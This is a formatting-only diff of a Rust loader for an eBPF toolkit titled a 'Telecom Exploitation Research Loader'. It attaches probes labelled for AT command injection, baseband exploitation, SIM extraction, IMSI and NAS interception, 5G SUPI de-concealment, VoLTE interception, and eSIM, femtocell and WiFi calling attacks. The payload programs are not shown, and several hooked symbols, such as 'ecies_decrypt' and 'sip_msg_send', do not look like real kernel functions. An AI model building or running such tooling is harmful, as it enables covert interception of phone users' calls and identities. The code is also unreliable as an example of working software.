@@ -1,12 +1,12 @@
 use std::path::PathBuf;
-use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 
 use anyhow::{Context, Result};
-use aya::programs::{KProbe, SchedClassifier, Xdp, XdpFlags};
-use aya::{Ebpf, EbpfLoader};
 use aya::maps::AsyncPerfEventArray;
+use aya::programs::{KProbe, SchedClassifier, Xdp, XdpFlags};
 use aya::util::online_cpus;
+use aya::{Ebpf, EbpfLoader};
 use bytes::BytesMut;
 use clap::Parser;
 use tokio::signal;
@@ -20,7 +20,11 @@ use common::EventHeader;
 #[command(about = "StaticZero Telecom Exploitation Research Loader")]
 struct Cli {
     /// Path to compiled eBPF object file
-    #[arg(short, long, default_value = "target/bpfel-unknown-none/release/staticzero-offense")]
+    #[arg(
+        short,
+        long,
+        default_value = "target/bpfel-unknown-none/release/staticzero-offense"
+    )]
     bpf_path: PathBuf,
 
     /// Enable telecom interception (F89-F100: AT cmd, baseband, SIM, IMSI, downgrade, GTP, SS7, Diameter, RRC, NAS, SUPI, N2)
@@ -81,13 +85,37 @@ async fn main() -> Result<()> {
     if enable_telecom {
         // Kprobes for modem/baseband/SIM/NAS interception
         let kprobes = [
-            ("shadow_at_cmd_inject", "tty_write", "F89: AT Command Injection"),
-            ("shadow_baseband_exploit", "usb_submit_urb", "F90: Baseband Exploitation"),
+            (
+                "shadow_at_cmd_inject",
+                "tty_write",
+                "F89: AT Command Injection",
+            ),
+            (
+                "shadow_baseband_exploit",
+                "usb_submit_urb",
+                "F90: Baseband Exploitation",
+            ),
             ("shadow_sim_clone", "vfs_read", "F91: SIM Data Extraction"),
-            ("shadow_imsi_intercept", "qmi_wwan_rx_fixup", "F92: IMSI Interception"),
-            ("shadow_rrc_redirect", "tty_write", "F93: RRC Connection Redirect"),
-            ("shadow_nas_intercept", "qmi_wwan_rx_fixup", "F98: NAS Message Interception"),
-            ("shadow_supi_deconceal", "ecies_decrypt", "F99: 5G SUPI De-concealment"),
+            (
+                "shadow_imsi_intercept",
+                "qmi_wwan_rx_fixup",
+                "F92: IMSI Interception",
+            ),
+            (
+                "shadow_rrc_redirect",
+                "tty_write",
+                "F93: RRC Connection Redirect",
+            ),
+            (
+                "shadow_nas_intercept",
+                "qmi_wwan_rx_fixup",
+                "F98: NAS Message Interception",
+            ),
+            (
+                "shadow_supi_deconceal",
+                "ecies_decrypt",
+                "F99: 5G SUPI De-concealment",
+            ),
         ];
 
         for (name, attach_point, desc) in &kprobes {
@@ -130,9 +158,21 @@ async fn main() -> Result<()> {
     // ── Features 101-108: Advanced Telecom ───────────────────────────────────
     if enable_advanced {
         let advanced_kprobes = [
-            ("shadow_volte_intercept", "sip_msg_send", "F101: VoLTE/VoNR Interception"),
-            ("shadow_esim_exploit", "tty_write", "F102: eSIM Provisioning Attack"),
-            ("shadow_femtocell_exploit", "ipsec_output", "F106: Femtocell Exploitation"),
+            (
+                "shadow_volte_intercept",
+                "sip_msg_send",
+                "F101: VoLTE/VoNR Interception",
+            ),
+            (
+                "shadow_esim_exploit",
+                "tty_write",
+                "F102: eSIM Provisioning Attack",
+            ),
+            (
+                "shadow_femtocell_exploit",
+                "ipsec_output",
+                "F106: Femtocell Exploitation",
+            ),
         ];
 
         for (name, attach_point, desc) in &advanced_kprobes {
@@ -152,7 +192,10 @@ async fn main() -> Result<()> {
             let xdp: &mut Xdp = prog.try_into()?;
             xdp.load()?;
             xdp.attach(&cli.wifi_iface, XdpFlags::default())?;
-            info!("F104: WiFi Calling Exploitation enabled on {}", cli.wifi_iface);
+            info!(
+                "F104: WiFi Calling Exploitation enabled on {}",
+                cli.wifi_iface
+            );
         }
 
         // TC classifiers for advanced telecom
@@ -174,7 +217,8 @@ async fn main() -> Result<()> {
 
     // ── Event loop ───────────────────────────────────────────────────────────
     let mut perf_array = AsyncPerfEventArray::try_from(
-        bpf.take_map("TELECOM_EVENTS").context("TELECOM_EVENTS map not found")?,
+        bpf.take_map("TELECOM_EVENTS")
+            .context("TELECOM_EVENTS map not found")?,
     )?;
 
     let cpus = online_cpus().map_err(|e| anyhow::anyhow!("failed to get online CPUs: {}", e))?;
